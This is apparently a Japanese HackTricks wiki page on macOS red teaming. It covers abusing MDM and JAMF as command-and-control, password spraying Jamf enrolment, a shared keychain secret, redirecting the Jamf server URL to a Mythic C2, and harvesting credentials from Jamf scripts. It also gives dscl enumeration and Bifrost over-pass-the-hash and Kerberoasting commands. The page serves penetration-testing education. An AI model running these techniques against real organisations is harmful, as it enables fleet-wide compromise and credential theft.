# macOS レッドチーミング

{{#include ../../banners/hacktricks-training.md}}


## MDMの悪用

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

管理プラットフォームにアクセスするための**管理者認証情報を侵害**できれば、マルウェアを各マシンに配布して、**すべてのコンピューターを侵害できる可能性があります**。

MacOS環境でレッドチーミングを行うには、MDMの仕組みをある程度理解しておくことを強く推奨します。


{{#ref}}
macos-mdm/
{{#endref}}

### MDMをC2として使用する

MDMには、プロファイルのインストール、照会、削除、アプリケーションのインストール、ローカル管理者アカウントの作成、ファームウェアパスワードの設定、FileVaultキーの変更などの権限があります。

独自のMDMを運用するには、**CSRにベンダーの署名を受ける必要があります**。[**https://mdmcert.download/**](https://mdmcert.download/)で取得を試みることができます。また、Appleデバイス向けに独自のMDMを運用するには、[**MicroMDM**](https://github.com/micromdm/micromdm)を利用できます。

MDMへの登録によって、管理サーバーのTLS証明書が自動的に信頼されたCAになるわけでも、アプリ署名用のIDが付与されるわけでもありません。サーバーがプライベートCAを使用している場合、そのルート証明書と中間証明書を登録プロファイルまたは別の信頼プロファイルで提供する必要があります。MDM認証に使われるクライアントIDは、これとは別の証明書です。<sup>[[7]](#references)</sup>

ダウンロードしたMDM登録プロファイル（`.mobileconfig`）は、**システム設定 → 一般 → デバイス管理**で開いて承認する必要があります。ルート権限でインストールされる`.pkg`に含めたり、Safariで開いたZIPに含めたりしても、現在のMacが密かに登録されることはありません。[構成プロファイルの動作](../macos-auto-start-locations.md#configuration-profiles-mobileconfig)を参照してください。<sup>[[8]](#references)</sup>

セットアップアシスタント中の自動デバイス登録は別の手順です。異なる前提条件については、[別の組織のデバイスを不正に登録する](macos-mdm/enrolling-devices-in-other-organisations.md)を参照してください。<sup>[[9]](#references)</sup>

**Mythic agent Orthrus**はこの手法を使用します。

### 管理下のMDMを通じたパッケージの配布

**macOS 26以降を実行する監視対象のMac**では、MDMサービスを制御することで、システムスコープに`com.apple.configuration.package`宣言を設定できます。<sup>[[10]](#references)</sup> パッケージにはデバイスが検証できる署名が必要ですが、アプリには別途Developer ID署名は必要ありません。デバイス管理を通じてインストールされたアプリは、Gatekeeperによるチェックを受けないためです。<sup>[[11]](#references)</sup> 信頼されたサーバーTLS証明書だけでは、そのパッケージの署名に必要な秘密鍵や署名用途は得られません。<sup>[[11]](#references)[[12]](#references)</sup>

署名済みのテストパッケージをビルドしてダイジェストを計算し、パッケージと`ManifestURL` plistをHTTPS経由で公開します。マニフェストには、URLとSHA-256を含む`software-package`アセットを1つと、一意の`bundle-identifier`および`bundle-version`が必要です。<sup>[[11]](#references)</sup> 次に、そのマニフェストURLを指定し、`InstallBehavior.Install`を`Required`に設定したパッケージ宣言を送信します。インストール状況やエラーは、`package.list`ステータス項目で確認してください。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

MDMサービス経由で送信する、必要最小限のインストール宣言は次のようになります（URLと両方のUUIDを置き換えてください）。<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### JAMF PRO の悪用

JAMF は、**カスタムスクリプト**（sysadmin が開発したスクリプト）、**ネイティブ payloads**（ローカルアカウントの作成、EFI パスワードの設定、ファイル／プロセスの監視など）、および **MDM**（デバイス設定、デバイス証明書など）を実行できます。<sup>[[5]](#references)</sup>

#### JAMF のセルフ登録

`https://<company-name>.jamfcloud.com/enroll/` のようなページにアクセスして、**セルフ登録が有効になっているか**確認してください。有効になっている場合、**アクセスするための認証情報を求められる**ことがあります。

password spraying 攻撃を行うには、[**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) スクリプトを使用できます。

さらに、有効な認証情報を見つけた後、次のフォームから他のユーザー名を brute-force できる可能性があります。

![JAMF PRO の悪用 - JAMF のセルフ登録: さらに、有効な認証情報を見つけた後、次のフォームから他のユーザー名を brute-force できる可能性があります](<../../images/image (107).png>)

#### JAMF デバイス認証

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** バイナリには、キーチェーンを開くためのシークレットが含まれていました。発見当時、このシークレットは全員で**共有**されており、その値は **`jk23ucnq91jfu9aj`** でした。<sup>[[5]](#references)</sup>\
さらに、jamf は **`/Library/LaunchAgents/com.jamf.management.agent.plist`** に **LaunchDaemon** として永続化します。

#### JAMF デバイスの乗っ取り

**`jamf`** が使用する **JSS**（Jamf Software Server）の **URL** は、**`/Library/Preferences/com.jamfsoftware.jamf.plist`** にあります。\
このファイルには、基本的に URL が記載されています。

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

したがって、攻撃者は、インストール時に Typhon agent の URL を Mythic C2 listener に設定して、JAMF を C2 として悪用できるようにする悪意のあるパッケージ（`pkg`）を配置し、このファイルを**上書きする**可能性があります。

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### JAMF Impersonation

デバイスとJMF間の**通信を偽装する**には、次の情報が必要です。

- デバイスの**UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- デバイス証明書を含む**JAMF keychain**: `/Library/Application\ Support/Jamf/JAMF.keychain`

これらの情報を使って、**盗んだ**ハードウェアの**UUID**を設定し、**SIPを無効化したVMを作成**します。**JAMF keychainを配置**し、Jamfの**agentにhook**して、その情報を盗みます。

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

また、管理者がJamf経由で実行しようとする**カスタムスクリプト**は、`/Library/Application Support/Jamf/tmp/`に配置され、実行後に削除されるため、この場所を監視することもできます。これらのスクリプトには**認証情報が含まれている可能性があります**。

ただし、**認証情報**はスクリプトに**パラメータとして渡される**こともあるため、`ps aux | grep -i jamf`を監視する必要があります（root権限すら不要です）。

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py)スクリプトを使うと、新しいファイルの追加や、新しいプロセス引数を監視できます。

### macOS Remote Access

また、**MacOS**の「特殊な」**ネットワーク****プロトコル**についても説明します。


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

場合によっては、**MacOSコンピューターがADに接続されている**ことがあります。この場合、いつもどおりActive Directoryの**列挙**を試してください。次のページを参考にしてください。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

役立つ可能性のある**MacOSローカルツール**に`dscl`があります。

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

また、ADを自動で列挙し、Kerberosを操作するためのMacOS用ツールもあります。

- [**Machound**](https://github.com/XMCyber/MacHound): MacHoundはBloodhound監査ツールの拡張機能で、MacOSホスト上のActive Directoryの関係を収集して取り込むことができます。<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrostは、macOS上のHeimdal krb5 APIとやり取りするために設計されたObjective-Cプロジェクトです。このプロジェクトの目的は、ターゲットに他のフレームワークやパッケージを必要とせず、ネイティブAPIを使用してmacOSデバイス上のKerberosに関するセキュリティテストをより効果的に行えるようにすることです。
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directoryの列挙を行うJavaScript for Automation (JXA)ツールです。

### ドメイン情報

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### ユーザー

MacOS ユーザーは次の3種類です。

- **Local Users** — ローカルの OpenDirectory サービスによって管理され、Active Directory には一切接続されていません。
- **Network Users** — 認証に DC サーバーへの接続が必要な、一時的な Active Directory ユーザーです。
- **Mobile Users** — 認証情報とファイルのローカルバックアップを持つ Active Directory ユーザーです。

ユーザーとグループに関するローカル情報は、フォルダー _/var/db/dslocal/nodes/Default._ に保存されています。\
たとえば、_mark_ というユーザーの情報は _/var/db/dslocal/nodes/Default/users/mark.plist_ に、_admin_ グループの情報は _/var/db/dslocal/nodes/Default/groups/admin.plist_ に保存されています。

HasSession と AdminTo のエッジに加えて、**MacHound は Bloodhound データベースに3つの新しいエッジを追加します**。<sup>[[2]](#references)</sup>

- **CanSSH** - ホストへの SSH が許可されたエンティティ
- **CanVNC** - ホストへの VNC が許可されたエンティティ
- **CanAE** - ホスト上で AppleEvent スクリプトを実行することが許可されたエンティティ

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

詳細は [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Computer$ のパスワード

次の方法でパスワードを取得します:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

System keychain 内の **`Computer$`** パスワードにアクセスできます。

### Over-Pass-The-Hash

特定のユーザーとサービスの TGT を取得します。

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

TGTを取得したら、次の方法で現在のセッションに注入できます。

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

取得したサービスチケットを使って、他のコンピューター上の共有へのアクセスを試みることができます:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Keychainへのアクセス

Keychainには、プロンプトを表示させずにアクセスできれば、red team演習を進めるうえで役立つ機密情報が含まれている可能性が非常に高いです。


{{#ref}}
macos-keychain.md
{{#endref}}

## 外部サービス

MacOSのRed Teamingは、通常のWindows Red Teamingとは異なります。**MacOSは通常、複数の外部プラットフォームと直接統合されているためです**。MacOSの一般的な構成では、**OneLoginで同期された認証情報を使ってコンピュータにアクセスし、OneLogin経由で複数の外部サービス**（github、awsなど）にアクセスします。

## その他のRed Teamテクニック

### Safari

Safariでファイルをダウンロードすると、そのファイルが「安全」であれば**自動的に開かれます**。たとえば、**zipファイルをダウンロードすると**自動的に展開されます:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Apple狩り: 2021年のMacOS環境のRed Teaming - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [MacHoundの紹介: macOS Active Directoryベースの攻撃に対するソリューション](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - ドメイン列挙コマンド (dscl / net / ldapsearch相当)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [ダークサイドへようこそ、Appleがあります: macOS管理を悪用する](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: 「Jamf設定に対する攻撃者の視点」 - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [MacでのActive Directoryの探索 - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — デバイス管理サービスおよびデバイスの証明書を管理する](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Macで構成プロファイルを使用する](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — デバイス管理登録プロファイルを配布する](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — パッケージ宣言](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — パッケージをインストールする](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — ID](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
